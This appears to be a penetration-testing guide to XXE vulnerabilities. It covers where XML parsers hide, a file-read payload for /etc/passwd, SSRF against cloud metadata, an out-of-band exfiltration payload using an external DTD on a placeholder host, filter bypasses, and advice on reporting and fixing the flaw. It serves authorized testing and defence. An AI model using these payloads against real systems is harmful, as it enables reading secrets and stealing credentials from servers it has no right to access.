# XXE (XML External Entities)

If an app parses XML with external entities enabled, an attacker declares an entity that points at
a file or URL and the parser resolves it — reading local files, performing SSRF, or (with the
right features) worse. Anywhere XML crosses a trust boundary is a candidate.

## Find the XML

- Obvious: `Content-Type: application/xml`, SOAP, RSS/Atom, sitemap uploads, SVG, SAML.
- Hidden: file formats that are XML underneath — DOCX/XLSX/PPTX, SVG images, some config imports.
  An "upload an image/document" feature may feed a server-side XML parser.
- Try switching a JSON endpoint to XML (`Content-Type: application/xml` with an XML body) — some
  frameworks parse both.

## Core payloads

- **File read (in-band):**
  ```xml
  <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]> <r>&x;</r>
  ```
  reflected where the parsed value is echoed.
- **SSRF:** point the entity at an internal URL or cloud metadata
  (`SYSTEM "http://169.254.169.254/..."`).
- **Blind / OOB:** no reflection — use an external DTD on your server to exfiltrate via a
  parameter entity and a callback:
  ```xml
  <!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://you/evil.dtd"> %dtd;]>
  ```
  the DTD builds an entity that sends the file contents to your listener. Confirm with the OOB hit.
- **Parameter entities** are the workhorse when general entities are filtered.

## What to try when the obvious is blocked

- Entities filtered but the parser still fetches DTDs → OOB via parameter entities.
- **XInclude** when you can't control the DOCTYPE but can inject into a value the server wraps in
  XML.
- **SVG/Office** as the delivery vehicle when direct XML is rejected.

## Impact & escalation

File read → grab config/secrets/`/etc/passwd`. SSRF → internal services / cloud metadata → creds.
On some stacks, entity expansion or protocol wrappers escalate further. Match the ambition to what
the parser actually allows.

## Reporting

Show the XML sent, the file/SSRF result (or the OOB callback for blind), and the concrete data
reached. Read only what you need to prove it; use your own listener for OOB. Recommend disabling
external entities and DTD processing in the parser — that's the fix.
